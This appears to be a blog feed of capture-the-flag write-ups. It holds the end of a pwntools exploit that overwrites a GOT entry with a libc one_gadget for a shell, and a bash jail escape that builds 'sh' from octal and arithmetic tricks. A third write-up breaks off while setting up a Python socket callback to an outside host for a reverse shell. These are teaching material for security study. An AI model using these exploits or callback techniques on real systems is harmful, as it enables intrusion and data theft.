&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">get_one_gadget&lt;/span>(filename):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> list(map(
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> int,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> subprocess&lt;span style="color:#f92672">.&lt;/span>check_output([&lt;span style="color:#e6db74">&amp;#39;one_gadget&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;--raw&amp;#39;&lt;/span>, filename])&lt;span style="color:#f92672">.&lt;/span>split(&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39; &amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">exploit&lt;/span>():
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> offset &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x16b8&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> libc &lt;span style="color:#f92672">=&lt;/span> ELF(&lt;span style="color:#e6db74">&amp;#34;./libc.so.6&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> stdout_libc &lt;span style="color:#f92672">=&lt;/span> libc&lt;span style="color:#f92672">.&lt;/span>sym[&lt;span style="color:#e6db74">&amp;#34;_IO_2_1_stdout_&amp;#34;&lt;/span>]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> log&lt;span style="color:#f92672">.&lt;/span>info(&lt;span style="color:#e6db74">&amp;#34;stdout_libc: 0x&lt;/span>&lt;span style="color:#e6db74">%08x&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> stdout_libc)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># one gadget RCE offsets&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> one_gadgets &lt;span style="color:#f92672">=&lt;/span> get_one_gadget(&lt;span style="color:#e6db74">&amp;#39;./libc.so.6&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> log&lt;span style="color:#f92672">.&lt;/span>info(&lt;span style="color:#e6db74">&amp;#34;one gadget RCE offsets: &lt;/span>&lt;span style="color:#e6db74">%s&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> str(one_gadgets))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> target &lt;span style="color:#f92672">=&lt;/span> remote(HOST, PORT)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> target&lt;span style="color:#f92672">.&lt;/span>recvuntil(&lt;span style="color:#e6db74">&amp;#34;Here&amp;#39;s stdout:&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> buf &lt;span style="color:#f92672">=&lt;/span> target&lt;span style="color:#f92672">.&lt;/span>recvline()&lt;span style="color:#f92672">.&lt;/span>strip()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> stdout &lt;span style="color:#f92672">=&lt;/span> int(buf, &lt;span style="color:#ae81ff">16&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> log&lt;span style="color:#f92672">.&lt;/span>info(&lt;span style="color:#e6db74">&amp;#34;stdout: 0x&lt;/span>&lt;span style="color:#e6db74">%08x&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> stdout)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> libc_base &lt;span style="color:#f92672">=&lt;/span> stdout &lt;span style="color:#f92672">-&lt;/span> stdout_libc
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> log&lt;span style="color:#f92672">.&lt;/span>info(&lt;span style="color:#e6db74">&amp;#34;libc_base: 0x&lt;/span>&lt;span style="color:#e6db74">%08x&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> libc_base)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> got_entry &lt;span style="color:#f92672">=&lt;/span> stdout &lt;span style="color:#f92672">-&lt;/span> offset
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> one_gadget_libc &lt;span style="color:#f92672">=&lt;/span> libc_base &lt;span style="color:#f92672">+&lt;/span> one_gadgets[&lt;span style="color:#ae81ff">2&lt;/span>]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> log&lt;span style="color:#f92672">.&lt;/span>info(&lt;span style="color:#e6db74">&amp;#34;got_entry: 0x&lt;/span>&lt;span style="color:#e6db74">%08x&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> got_entry)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> log&lt;span style="color:#f92672">.&lt;/span>info(&lt;span style="color:#e6db74">&amp;#34;one_gadget: 0x&lt;/span>&lt;span style="color:#e6db74">%08x&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> one_gadget_libc)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> target&lt;span style="color:#f92672">.&lt;/span>recvuntil(&lt;span style="color:#e6db74">&amp;#34;do you want to write?&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> target&lt;span style="color:#f92672">.&lt;/span>sendline(&lt;span style="color:#e6db74">&amp;#39;8&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> target&lt;span style="color:#f92672">.&lt;/span>recvuntil(&lt;span style="color:#e6db74">&amp;#34;Where do you want to write?&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> target&lt;span style="color:#f92672">.&lt;/span>send(str(got_entry))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> target&lt;span style="color:#f92672">.&lt;/span>recvuntil(&lt;span style="color:#e6db74">&amp;#34;What do you want to write?&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> target&lt;span style="color:#f92672">.&lt;/span>sendline(p64(one_gadget_libc))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> target&lt;span style="color:#f92672">.&lt;/span>sendline(&lt;span style="color:#e6db74">&amp;#34;id;cat flag.txt;exit&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> buf &lt;span style="color:#f92672">=&lt;/span> target&lt;span style="color:#f92672">.&lt;/span>recvall()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#34;uid&amp;#34;&lt;/span> &lt;span style="color:#f92672">in&lt;/span> buf:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> log&lt;span style="color:#f92672">.&lt;/span>success(buf&lt;span style="color:#f92672">.&lt;/span>decode())
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> log&lt;span style="color:#f92672">.&lt;/span>failure(buf&lt;span style="color:#f92672">.&lt;/span>decode())
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">if&lt;/span> __name__ &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#34;__main__&amp;#34;&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> exploit()
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h4 id="running-the-exploit">Running the exploit&lt;/h4>
&lt;p>&lt;img src="https://philomath213.github.io/post/CSAW-CTF-Finals-2019-defile/screenshot1.png" alt="screenshot1">&lt;/p>
&lt;h4 id="flag">Flag&lt;/h4>
&lt;blockquote>
&lt;p>flag{me_you_in_room_1337_tonight}&lt;/p>
&lt;/blockquote></description></item><item><title>Securinets CTF Quals 2019 Special Revenge</title><link>https://philomath213.github.io/post/securinets-ctf-quals-2019-special-revenge/</link><pubDate>Mon, 25 Mar 2019 11:59:39 +0100</pubDate><guid>https://philomath213.github.io/post/securinets-ctf-quals-2019-special-revenge/</guid><description>&lt;h1 id="securinets-ctf-quals-2019---special-revenge-writeup">Securinets CTF Quals 2019 - Special Revenge WriteUp&lt;/h1>
&lt;h2 id="challenge-details">Challenge details&lt;/h2>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th style="text-align:center">Event&lt;/th>
&lt;th style="text-align:center">Challenge&lt;/th>
&lt;th style="text-align:center">Category&lt;/th>
&lt;th style="text-align:center">Points&lt;/th>
&lt;th style="text-align:center">Solves&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td style="text-align:center">Securinets CTF Quals 2019&lt;/td>
&lt;td style="text-align:center">Special Revenge&lt;/td>
&lt;td style="text-align:center">PWN&lt;/td>
&lt;td style="text-align:center">1000&lt;/td>
&lt;td style="text-align:center">5&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;h3 id="description">Description&lt;/h3>
&lt;blockquote>
&lt;p>After the disappointment of last year challenge &amp;ldquo;special&amp;rdquo;, I came this year with a mystery revenge.&lt;/p>
&lt;p>ssh &lt;a href="mailto:special@51.254.114.246">special@51.254.114.246&lt;/a>&lt;/p>
&lt;p>password : b8f07e1000c719c6a7febde4ec0ab24d&lt;/p>
&lt;p>Author : Anis_Boss&lt;/p>
&lt;/blockquote>
&lt;p>Another jail escape challenge, we were provided with ssh login (username special).&lt;/p>
&lt;p>After being logged in to the server we will get this welcome message, and a prompt where we can type our command.&lt;/p>
&lt;pre tabindex="0">&lt;code>================================
Welcome to Special Revenge
================================
|| ||&amp;lt;(.)&amp;gt;||&amp;lt;(.)&amp;gt;|| ||
|| _|| || ||_ ||
|| (__D || C__) ||
|| (__D || C__) ||
|| (__D || C__) ||
|| (__D || C__) ||
|| || || || ||
================================
Securinets - Quals
================================
&amp;gt;&amp;gt;
&lt;/code>&lt;/pre>&lt;p>As expected we can execute the usual command in this very restricted shell (&lt;code>ls&lt;/code>, &lt;code>cat&lt;/code>, &lt;code>id&lt;/code>), also we didn&amp;rsquo;t get any error message by typing these commands.&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;gt;&amp;gt; ls
&amp;gt;&amp;gt; id
&amp;gt;&amp;gt; cat /etc/passwd
&amp;gt;&amp;gt; echo helloooooo
&lt;/code>&lt;/pre>&lt;p>I tried to escape this jail by sending interrupt signal (&lt;code>CTRL+Z&lt;/code>) since this a ssh session, and I got this message &lt;code>&amp;quot;Hemm, nice one but you can't escape&amp;quot;&lt;/code>, it seems that signal handler are altered by the jail script.&lt;/p>
&lt;p>Then I typed all alphanumeric characters to see if there any filters or a whitelist for words/characters, and got this very helpful error message.&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;gt;&amp;gt; 0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ
./mystery.sh: line 29: 1: command not found
&lt;/code>&lt;/pre>&lt;p>which means that all the alphanumeric charset is filtered except &lt;code>1&lt;/code> (&lt;code>1&lt;/code>: command not found), and the jail script is executing the filter input at the end.&lt;/p>
&lt;p>I also did some tests to see if there are any allowed special characters, because with only &lt;code>1&lt;/code> there are no way to escape this jail, each time I put &lt;code>1&lt;/code> at the beginning and at the end and see what left between them.&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;gt;&amp;gt; 1~`/;@#1
./mystery.sh: line 29: 1#1: command not found
&lt;/code>&lt;/pre>&lt;p>This means that &lt;code>~`/;@&lt;/code> are filtered while &lt;code>#&lt;/code> is allowed.&lt;/p>
&lt;p>After few attempts, I figure out that only these characters are allowed
&lt;code>1&amp;lt;\&amp;quot;#$'(){}&lt;/code>&lt;/p>
&lt;p>So how can we escape this jail using just these 11 chars !!!!.&lt;/p>
&lt;h3 id="objective">Objective&lt;/h3>
&lt;p>Our objective is escaping this jail, How ??, by executing &lt;code>/bin/sh&lt;/code> or just &lt;code>sh&lt;/code> for short to spawn a shell, or by typing break to break the loop, &amp;hellip;&lt;/p>
&lt;p>the easiest one is spawning a shell by executing the &lt;code>sh&lt;/code> command, so we need to build the &lt;code>sh&lt;/code> string using the allowed characters.&lt;/p>
&lt;h3 id="our-arsenal">Our Arsenal&lt;/h3>
&lt;p>Despite the fact that all alphabetic are filtered, we have quit a few tricks at our disposal that we can use to build any command.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$# &lt;span style="color:#75715e"># number of arguments, evaluates as 0 in this case&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">$((&lt;/span>expr&lt;span style="color:#66d9ef">))&lt;/span> &lt;span style="color:#75715e"># evaluate an arithmetic expression&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">$&amp;#39;\116&amp;#39;&lt;/span> &lt;span style="color:#75715e"># convert octal to a character in string literal&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>The 1st trick: &lt;code>$#&lt;/code> evaluates as &lt;code>0&lt;/code>&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;gt;&amp;gt; $#
./mystery.sh: line 29: 0: command not found
&lt;/code>&lt;/pre>&lt;p>So we have &lt;code>1&lt;/code> and &lt;code>0&lt;/code> in our hands, what come in my mind first was binary, since everything is built upon binary we can for sure build anything using these two lovely characters.&lt;/p>
&lt;p>The 2nd trick: &lt;code>$((expr))&lt;/code> will evaluate the arithmetic expression &lt;code>expr&lt;/code> and return the result.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#examples&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ echo &lt;span style="color:#66d9ef">$((&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#66d9ef">))&lt;/span> &lt;span style="color:#75715e"># addition&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ echo &lt;span style="color:#66d9ef">$((&lt;/span>&lt;span style="color:#ae81ff">6&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#66d9ef">))&lt;/span> &lt;span style="color:#75715e"># subtraction&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">5&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ echo &lt;span style="color:#66d9ef">$((&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#ae81ff">3&lt;/span>&lt;span style="color:#66d9ef">))&lt;/span> &lt;span style="color:#75715e"># multiplication&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">6&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ echo &lt;span style="color:#66d9ef">$((&lt;/span>&lt;span style="color:#ae81ff">6&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#66d9ef">))&lt;/span> &lt;span style="color:#75715e"># division&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">3&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ echo &lt;span style="color:#66d9ef">$((&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#e6db74">&amp;lt;&amp;lt;4)) # shift left
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">32
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">$ echo $((32&amp;gt;&amp;gt;4&lt;/span>&lt;span style="color:#66d9ef">))&lt;/span> &lt;span style="color:#75715e"># shift right&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ echo &lt;span style="color:#66d9ef">$((&lt;/span>&lt;span style="color:#ae81ff">2#1010&lt;/span>&lt;span style="color:#66d9ef">))&lt;/span> &lt;span style="color:#75715e"># convert binary value to decimal&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">10&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>The last one is what we need, but we don&amp;rsquo;t have the character &lt;code>2&lt;/code>.&lt;/p>
&lt;p>Fortunately we can get &lt;code>2&lt;/code> just by shifting left &lt;code>1&lt;/code> by one bit&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ echo &lt;span style="color:#66d9ef">$((&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&amp;lt;&amp;lt;&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#66d9ef">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># $((1&amp;lt;&amp;lt;1)) =&amp;gt; 2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># $# =&amp;gt; 0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># $(($((1&amp;lt;&amp;lt;1))#1$#1$#)) =&amp;gt; $((2#1010)) =&amp;gt; 10&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>echo &lt;span style="color:#66d9ef">$(($((&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#e6db74">&amp;lt;&amp;lt;1))#1&lt;/span>$#&lt;span style="color:#ae81ff">1&lt;/span>$#&lt;span style="color:#66d9ef">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">10&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>The 3rd trick, &lt;code>$'\116'&lt;/code> convert the octal value &lt;code>116&lt;/code> to a character &lt;code>N&lt;/code> in string literal.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ echo &lt;span style="color:#e6db74">$&amp;#39;\163&amp;#39;$&amp;#39;\150&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sh
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h4 id="remark">Remark&lt;/h4>
&lt;p>I noticed that the input will be evaluate recursively twice, something like &lt;code>eval(eval(INPUT))&lt;/code>.&lt;/p>
&lt;p>When I run &lt;code>\$\'\\1$#1\'&lt;/code> in my bash I get this:&lt;/p>
&lt;pre tabindex="0">&lt;code>$ \$\&amp;#39;\\1$#1\&amp;#39;
bash: $&amp;#39;\101&amp;#39;: command not found
&lt;/code>&lt;/pre>&lt;p>but when running the same input in the jail, I get this:&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;gt;&amp;gt; \$\&amp;#39;\\1$#1\&amp;#39;
/opt/mystery.sh: line 29: A: command not found
&lt;/code>&lt;/pre>&lt;h2 id="putting-the-pieces-together">Putting the Pieces Together&lt;/h2>
&lt;pre tabindex="0">&lt;code>\$\&amp;#39;\\$(($((1&amp;lt;&amp;lt;1))#1$#1$#$#$#11))\&amp;#39;\$\&amp;#39;\\$(($((1&amp;lt;&amp;lt;1))#1$#$#1$#11$#))\&amp;#39;
# 1st evaluation
=&amp;gt; \$\&amp;#39;\\$((2#10100011))\&amp;#39;\$\&amp;#39;\\$((2#10010110))\&amp;#39;
=&amp;gt; \$\&amp;#39;\\163\&amp;#39;\$\&amp;#39;\\150\&amp;#39;
=&amp;gt; $&amp;#39;\163&amp;#39;$&amp;#39;\150&amp;#39;
# 2nd evaluation
=&amp;gt; sh
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>&amp;gt;&amp;gt; \$\&amp;#39;\\$(($((1&amp;lt;&amp;lt;1))#1$#1$#$#$#11))\&amp;#39;\$\&amp;#39;\\$(($((1&amp;lt;&amp;lt;1))#1$#$#1$#11$#))\&amp;#39;
$ id
uid=1015(special) gid=1015(special) groups=1015(special)
$ ls -la
total 28
dr-xr-xr-x 2 special special 4096 Mar 22 02:02 .
drwxr-xr-x 22 root root 4096 Mar 24 10:18 ..
-rw-r--r-- 1 special special 220 Sep 1 2015 .bash_logout
-rw-r--r-- 1 special special 3771 Sep 1 2015 .bashrc
-rw-r----- 1 root special 47 Mar 22 02:02 flag.txt
-rw-r-x--- 1 root special 752 Mar 22 01:55 mystery
-rw-r--r-- 1 special special 655 May 16 2017 .profile
$ cat flag.txt
securinets{bash_never_stop_from_being_awesome}
&lt;/code>&lt;/pre>&lt;h2 id="conclusion">Conclusion&lt;/h2>
&lt;p>Jail challenges are always painful at the beginning, so they require more patient than usual challenges. A good understanding of the shell environment and built-ins can be handful in scenarios like this one.&lt;/p>
&lt;p>FLAG: &lt;code>securinets{bash_never_stop_from_being_awesome}&lt;/code>&lt;/p></description></item><item><title>Securinets CTF Quals 2019 Stone Mining</title><link>https://philomath213.github.io/post/securinets-ctf-quals-2019-stone-mining/</link><pubDate>Sun, 24 Mar 2019 19:00:46 +0100</pubDate><guid>https://philomath213.github.io/post/securinets-ctf-quals-2019-stone-mining/</guid><description>&lt;h1 id="securinets-ctf-quals-2019---stone-mining-writeup">Securinets CTF Quals 2019 - Stone Mining WriteUp&lt;/h1>
&lt;h2 id="challenge-details">Challenge details&lt;/h2>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th style="text-align:center">Event&lt;/th>
&lt;th style="text-align:center">Challenge&lt;/th>
&lt;th style="text-align:center">Category&lt;/th>
&lt;th style="text-align:center">Points&lt;/th>
&lt;th style="text-align:center">Solves&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td style="text-align:center">Securinets CTF Quals 2019&lt;/td>
&lt;td style="text-align:center">Stone Mining&lt;/td>
&lt;td style="text-align:center">PWN&lt;/td>
&lt;td style="text-align:center">1000&lt;/td>
&lt;td style="text-align:center">4&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;h3 id="description">Description&lt;/h3>
&lt;blockquote>
&lt;p>I went inside a mine thinking it was safe, but got stuck. Help me out.&lt;/p>
&lt;p>Service is running at: nc 52.17.200.40 4000&lt;/p>
&lt;p>Author: bibiwars&lt;/p>
&lt;/blockquote>
&lt;p>A jail escape challenge this time, with no prompt, probably a shell jail.&lt;/p>
&lt;pre tabindex="0">&lt;code>Jail - Stone Mining
Objective is to read &amp;#39;flag&amp;#39; file from the current directory
___________________________________________________________
&lt;/code>&lt;/pre>&lt;p>we can start by executing some random commands:&lt;/p>
&lt;p>shell: id, echo foobar, whoami &amp;hellip;&lt;/p>
&lt;p>python: print(&amp;ldquo;foobar&amp;rdquo;), dir() &amp;hellip;&lt;/p>
&lt;p>&amp;hellip;&lt;/p>
&lt;pre tabindex="0">&lt;code>id
Not today, some blacklisted caracter has been used
echo foobar
Not today, some blacklisted caracter has been used
print(&amp;#34;foboar&amp;#34;)
Not today, some blacklisted caracter has been used
dir()
Not today, some blacklisted caracter has been used
&lt;/code>&lt;/pre>&lt;p>We got only one message &amp;ldquo;Not today, some blacklisted caracter has been used&amp;rdquo;, which means that there are some blacklisted chars.&lt;/p>
&lt;pre tabindex="0">&lt;code>a
Not today, some blacklisted caracter has been used
b
Command executed :D
c
Not today, some blacklisted caracter has been used
d
Command executed :D
e
Command executed :D
f
Not today, some blacklisted caracter has been used
0
Not today, some blacklisted caracter has been used
1
Not today, some blacklisted caracter has been used
2
Not today, some blacklisted caracter has been used
3
Not today, some blacklisted caracter has been used
&lt;/code>&lt;/pre>&lt;p>As we can see, at least there some allowed chars.&lt;/p>
&lt;p>After some testing I found that these ascii lower case chars are allowed&lt;/p>
&lt;pre tabindex="0">&lt;code>ertyuopdghbn
&lt;/code>&lt;/pre>&lt;p>There are other allowed chars, but I used only these char to escape the jail.&lt;/p>
&lt;p>So how can we bypass that ?&lt;/p>
&lt;p>I first noticed that we can use &amp;ldquo;python&amp;rdquo; word since all its chars are allowed.&lt;/p>
&lt;p>I made an attempt to print to stdout, but didn&amp;rsquo;t get any output&lt;/p>
&lt;pre tabindex="0">&lt;code>$ nc 52.17.200.40 4000
Jail - Stone Mining
Objective is to read &amp;#39;flag&amp;#39; file from the current directory
___________________________________________________________
python
print(&amp;#39;foobar&amp;#39;)
exit()
^C
&lt;/code>&lt;/pre>&lt;p>So, I made an assumption that stdout, and stderr are closed, or filtered. Therefore, I attempt to connect to the outside using python sockets.&lt;/p>
&lt;p>I start a listener on my host and connect to it.&lt;/p>
&lt;p>Remote Host:&lt;/p>
&lt;pre tabindex="0">&lt;code>$ nc 52.17.200.40 4000
Jail - Stone Mining
Objective is to read &amp;#39;flag&amp;#39; file from the current directory
___________________________________________________________
python
import socket
s = socket.socket()
s.connect((&amp;#39;41.102.162.29&amp;#39;, 2130))
s.send(b&amp;#39;test\n&amp;#39;)
^C
&lt;/code>&lt;/pre>&lt;p>My host:&lt;/p>
&lt;pre tabindex="0">&lt;code>nc -vvntlp 2130
Listening on any address 2130 (xds)
Connection from 41.102.162.29:39198
test
Total received bytes: 5
Total sent bytes: 0
&lt;/code>&lt;/pre>&lt;p>So it works fine, after closing the connection (CTRL+C to close netcat).&lt;/p>
&lt;h2 id="putting-the-pieces-together">Putting the Pieces Together&lt;/h2>
&lt;p>The goal is getting reverse shell.&lt;/p>
&lt;p>First, Run the python interpreter.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>python
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Then copy/past the payload there, the script won&amp;rsquo;t execute til the connection is closed, since we are using netcat we need to send interrupt signal CTRL+C to close the connection.&lt;/p>
